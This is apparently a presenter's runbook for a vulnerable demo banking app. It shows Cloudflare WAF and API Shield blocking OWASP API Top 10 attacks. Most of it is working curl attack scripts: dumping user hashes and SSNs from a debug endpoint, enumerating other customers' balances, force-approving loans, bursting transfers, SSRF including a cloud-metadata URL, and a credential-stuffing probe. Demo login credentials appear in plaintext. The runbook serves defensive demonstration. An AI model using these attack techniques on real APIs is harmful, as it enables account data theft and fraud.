Part 0 — Terminal setup: how to run every command in this guide

Use Git Bash. Every command in this guide is bash + curl. Do not use PowerShell or cmd.exe — PowerShell's curl is a different tool (Invoke-WebRequest) and it mangles JSON quoting; cmd.exe doesn't understand $(...) at all.

Open the terminal

  • In File Explorer, go to C:\Users\drecla\Dev Projects\banking → right-click inside the folder → Open Git Bash here.
  • Or in VS Code: Terminal → New Terminal, and set the profile dropdown to Git Bash.

Bootstrap once per terminal window

Paste this whole block. It sets the base URL, logs in as the attacker's ordinary customer (chris.brown), stores the JWT in $TOKEN, and finds that user's savings-account id in $SAVINGS_ID. Every attack command in Part 3 assumes these three variables exist.

BASE=https://banking.puregroundscoffee.com

TOKEN=$(curl.exe -s --ssl-no-revoke -X POST \
  -H 'Content-Type: application/json' \
  -d '{"username":"chris.brown","password":"cbrown123"}' \
  $BASE/api/auth/login | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')

SAVINGS_ID=$(curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" \
  $BASE/api/accounts | sed -n 's/.*{"id":"\([^"]*\)"[^{]*"account_type":"savings".*/\1/p' | head -1)

echo "token loaded, savings account $SAVINGS_ID"

Verify it worked: the echo line must print a UUID for the savings account. Tokens last 24h, but re-paste the whole block if you open a new terminal — variables don't carry over. Note: the login endpoint allows 5 attempts/minute; the bootstrap uses one, each script uses one.

About the flags you'll see

  • curl.exe (not curl) — explicit and safe everywhere on this box.
  • --ssl-no-revoke — required on this machine's network (TLS revocation lookups fail); harmless elsewhere.
  • -s — quiet output. Drop it when troubleshooting.
  • -w "%{http_code}" — appends the HTTP status so pass/fail is visible in scripts.
PowerShell fallback (only if Git Bash is truly unavailable): always type curl.exe, write JSON bodies to a file with '{"username":"chris.brown","password":"cbrown123"}' | Out-File login.json -Encoding utf8 -NoNewline (UTF-16 breaks curl), send with --data "@login.json", and capture tokens with $token = (curl.exe ... | ConvertFrom-Json).token.

Part 2 — Live demo runbook (~25 minutes)

First: open Git Bash and paste the Part 0 bootstrap block so $TOKEN and friends exist.

  • Homepage + dashboard UI briefly: a real bank, real balances, a reconciling ledger.

  • Narrate per line using the Part 3 cards (script order = card order).
  • Pause on the visible damage: the force-approved $3000 loan (refresh chris.brown's dashboard — money landed) and the BOLA dump of all five customers' balances.

Act 2 — Arm the edge (1 min, live on camera)

python scripts/demo-edge-config.py arm

One command: schema validation log → block + all eight staged rules enabled, including the exposed-credential check. Say: "Configuration on your Cloudflare zone. Nothing redeployed, no code changes."

Act 3 — "After": same attacks, different outcome (8 min)

  • Run ./attack-simulation.sh after → expect all BLOCKED.
  • Call out the block mechanisms per line (429 rate limit vs 403 schema/fallthrough).
  • Security → Events, filter last 15 minutes: every blocked attempt, rule-named. The exposed-credential leg, if any leaked pair was used, appears here too.
  • API Shield → Discovery: GET /api/v1/accounts discovered as an operation absent from the uploaded schema — the shadow API, found. Check the sensitive-data label on /api/internal/debug after traffic flowed over it.
  • Optional UI beat: homepage → Secure upload button → EICAR test file → "Blocked at the Cloudflare edge".

Act 4 — Wrap (3 min)

  • Re-run ./test-api.sh with protections still armed → still 39/39: legitimate traffic untouched.
  • Forward-looking: ML posture features (BOLA labels, Volumetric Abuse rate recommendations) accrue over production-weeks — today you saw the deterministic layer.
  • Finish with python scripts/demo-edge-config.py disarm so the zone returns to staged.

Part 3 — Per-attack reference

BEFORE = zone default (disarmed); AFTER = armed. Every "after" result was observed live. Commands assume the Part 0 bootstrap.

Attack 1 · Broken Authentication — OWASP API2

Endpoint: GET /api/internal/debug
What's attackedInternal diagnostics endpoint with no auth check; dumps the user table incl. password hashes, salts, and fake-SSN fields, plus auth config. Feature showcasedWAF custom rule blocking no-token requests to internal paths (deterministic version of API Shield JWT presence validation). Before200 — full dump After403 at the edge 
curl.exe -s --ssl-no-revoke $BASE/api/internal/debug
# before: JSON with every user incl. "password_hash", "salt", "ssn"
# after:  HTTP 403 — never reached the app

Attack 2 · Shadow API / Improper Inventory — OWASP API9

Endpoint: GET /api/v1/accounts (accepts a ?userId= override)
What's attackedDeprecated v1 endpoint never decommissioned: undocumented, missing from the OpenAPI schema, serving verbose rows. Feature showcasedAPI Discovery (finds the shadow op in traffic) + schema-validation fallthrough rule — anything not in the uploaded schema is hostile. Before200 — verbose data served After403 fallthrough block 
curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" $BASE/api/v1/accounts
# and the never-removed cross-user override:
curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" "$BASE/api/v1/accounts?userId=f49a7d79-e6dc-4c91-ba4a-5d62be9f81e7"

Attack 3 · Broken Function Level Authorization — OWASP API5

Endpoints: GET /api/admin/users · POST /api/admin/loans/:id/force-approve
What's attackedAdmin-only functions with no role check — an ordinary customer token works. The force-approve path really moves money. Feature showcasedFallthrough rule (admin paths aren't in the schema). Optional upgrade: edge JWT role-claim rule (tokens already carry role; needs the JWT secret in a dashboard Token Configuration). Before200 — list leaked; $3000 loan approved & disbursed After403; loan stays pending_review 
curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" $BASE/api/admin/users

# apply for $3000 (auto pending_review), grab its id, then force-approve:
LOAN=$(curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d "{\"amount\":3000,\"termMonths\":24,\"disburseAccountId\":\"$SAVINGS_ID\"}" \
  $BASE/api/loans/apply)
LOAN_ID=$(printf '%s' "$LOAN" | sed -n 's/.*"id":"\([^"]*\)".*/\1/p')
curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \
  $BASE/api/admin/loans/$LOAN_ID/force-approve
# before: {"message":"Loan approved and disbursed",...} — refresh the dashboard, the money is there
# after:  HTTP 403 — loan still pending_review

Attack 4 · Broken Object Level Authorization (BOLA) — OWASP API1

Endpoint: GET /api/users/:userId/balance
What's attackedNo ownership check: any authenticated user reads any user's balances by guessing/collecting ids. Feature showcasedRate-limiting rule on the path (enumeration is inherently high-rate per session) plus the fallthrough rule (path undocumented). In production, Cloudflare's ML BOLA labels accrue over 10k+ sessions — position as posture tooling, not a live trick. Before5 customer profiles harvested After403/429 — enumeration dies 
# collect victim ids from the debug dump (works in "before"), then enumerate:
IDS=$(curl.exe -s --ssl-no-revoke $BASE/api/internal/debug \
  | grep -oE '"id":"[0-9a-f-]{36}"' | cut -d'"' -f4 | sort -u)
for uid in $IDS; do
  curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" $BASE/api/users/$uid/balance; echo
done
# after: 403 on every one (fallthrough), or 429 when the rate limit trips

Attack 5 · Excessive Data Exposure — OWASP API3

Endpoint: GET /api/profile and GET /api/profile?internal=1
What's attackedEndpoint returns far more than the UI needs; an undocumented param flips it to full-record mode (session payload, fake SSN, raw account rows). Feature showcasedWAF custom rule rejecting any query string on /api/profile (schema declares none). Say out loud: the base leak is app-side — the edge can't redact response bodies; it kills the undocumented access path. BeforeBoth leak After?internal=1 → 403; base leak = the fix-the-app talking point 
curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" "$BASE/api/profile"
# "passwordHash" and "salt" right there in the base response
curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" "$BASE/api/profile?internal=1"
# before: internal mode adds session payload + "ssn" + raw account rows
# after:  HTTP 403 — query string isn't in the documented contract

Attack 6 · Unrestricted Resource Consumption — OWASP API4

Endpoint: POST /api/transfers/express
What's attackedTransfer endpoint cloned from the real one minus every rate limit — a burst runs unthrottled. Feature showcasedWAF rate-limiting rule (429 past 10/min; also fallthrough-blocked as an undocumented path). Contrast the real transfer endpoint's in-app KV limiter: same control, zero code. Before20/20 completed After403/429 — burst dies 
for i in $(seq 1 20); do
  curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \
    -H 'Content-Type: application/json' \
    -d "{\"fromAccountId\":\"$SAVINGS_ID\",\"toUsername\":\"sarah.johnson\",\"toAccountType\":\"savings\",\"amount\":0.01}" \
    $BASE/api/transfers/express; echo
done
# before: 20 x "Express transfer completed"     after: 403 from request #1

Attack 7 · Sensitive Business Flows — OWASP API6

Endpoint: POST /api/loans/apply (existing legitimate endpoint — no frequency cap)
What's attackedApplication spam: nothing limits daily applications per customer (all stay pending_review; nothing disburses). Feature showcasedRate-limiting rule (5/min). Forward-looking pair: Volumetric Abuse Detection recommends per-endpoint, per-session limits from learned baselines. Before8/8 filed in seconds After429 past the fifth request 
for i in $(seq 1 8); do
  curl.exe -s --ssl-no-revoke -o /dev/null -w "application $i -> %{http_code}\n" \
    -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
    -d '{"amount":2000,"termMonths":12}' $BASE/api/loans/apply
done
# before: eight 201s         after: five 201s then 429s

Attack 8 · Server-Side Request Forgery (SSRF) — OWASP API7

Endpoint: POST /api/profile/avatar-from-url
What's attackedAny attacker-chosen URL is fetched server-side with no validation and the body returned. Feature showcasedFallthrough rule (path outside the documented API); for a documented variant, schema URL-allowlisting. Definitive SSRF fix is origin-side — say so; the edge compresses the surface to only-declared operations. Before200 — external body exfiltrated through the Worker After403 
curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"url":"https://example.com/"}' \
  $BASE/api/profile/avatar-from-url
# before: {"fetchedUrl":...,"bodyPreview":"<!doctype html>..."} — the Worker fetched it for us
# after:  HTTP 403 before the Worker ever runs.
# Also mention: {"url":"http://169.254.169.254/latest/meta-data"} — same block.
# (Cloudflare Workers can't actually reach link-local IPs; example.com is the visible exfil proof.)

Attack 9 · Security Misconfiguration — OWASP API8

Endpoint: POST /api/debug/parse
What's attackedMalformed JSON produces a 500 with a JavaScript stack trace incl. server-side file paths. Feature showcasedSchema strict typing + fallthrough: malformed bodies never reach the Worker — no error surface to mine. Before500 with stack trace After403/400 at the edge 
curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{not json' \
  $BASE/api/debug/parse
# before: 500 with JS stack trace + file paths     after: clean edge rejection

Beyond the OWASP API list — WAF/API Shield extras

Attack N1 · Exposed Credential Check

Surface: POST /api/auth/login (JSON {username, password} — exactly the shape the managed ruleset scans)
What's attackedCredential stuffing / reuse of passwords known from public breach corpuses. Feature showcasedCloudflare Exposed Credentials Check managed ruleset (staged as the 8th "PGC demo:" rule; executes in the managed WAF phase). On a hit it sets the Exposed-Credential-Check header and logs a Security Event — default action is non-blocking by design so a leaked-looking login never bricks the demo. BeforeRule off — no flagging AfterHits appear in Security Events (service: Exposed Credential Check) Honest caveatIt only fires on pairs actually present in the breach corpus. The seeded demo accounts are deliberately not leaked; to force a hit, run the login body with any genuinely pwned pair (or capture the corpus hit with known test credentials). Position it as detection+visibility. 
curl.exe -s --ssl-no-revoke -o /dev/null -w "leaked-cred login attempt -> %{http_code}\n" \
  -X POST -H 'Content-Type: application/json' \
  -d '{"username":"known.pwned.username","password":"known-pwned-password"}' \
  $BASE/api/auth/login
# app still says 401 (no such user) — the point is the edge FLAGGED the pair:
# Security → Events → filter Service "Exposed Credential Check"

Attack N3 · Malicious Upload (Content Scanning) — via the homepage button

Surface: homepage https://banking.puregroundscoffee.com/ → "File uploads, scanned before they land" → POSTs to /api/uploads → R2
What's attackedFile upload path with no type/size restrictions by app design. Feature showcasedWAF Malicious Uploads content scanning (zone Enterprise add-on: cf.waf.content_scan.has_malicious_obj → block rule, staged). The AV engine is the same one Cloudflare Zero Trust uses. Before201 — EICAR file stored in R2 After403 — "Blocked at the Cloudflare edge" right in the UI PrepCreate the EICAR test file once (command below). Log into the UI as the attacker (private window) so the homepage button has a token. Known trap: this machine's network Gateway blocks the upload client-side (302 block page) — do this leg from a clean network, and clean up the file from the Documents page afterwards when it does land. 
# create the industry-standard EICAR anti-malware test file (harmless string):
printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/eicar.com

# curl equivalent of what the homepage button does:
curl.exe -s --ssl-no-revoke -w "\nHTTP %{http_code}\n" -X POST \
  -H "Authorization: Bearer $TOKEN" -F "file=@/tmp/eicar.com" $BASE/api/uploads
# disarmed: 201 + id (cleanup: DELETE /api/uploads/<id>)
# armed + clean network: 403 from content scanning
# this machine: 302 — the LOCAL Gateway proxies it away first; use a clean device
